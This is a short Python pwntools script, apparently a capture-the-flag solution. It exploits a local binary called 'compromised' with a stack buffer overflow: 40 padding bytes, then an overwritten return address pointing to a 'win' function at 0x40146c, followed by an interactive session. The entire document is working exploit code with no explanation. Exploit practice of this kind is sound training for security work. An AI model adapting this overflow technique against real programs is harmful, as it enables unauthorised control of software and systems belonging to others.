from pwn import *

p = process("./compromised")

p.recvuntil(b">>>")
win = 0x40146c

payload = b'A' * 40
payload += p64(win)
p.sendline(payload)
p.interactive()
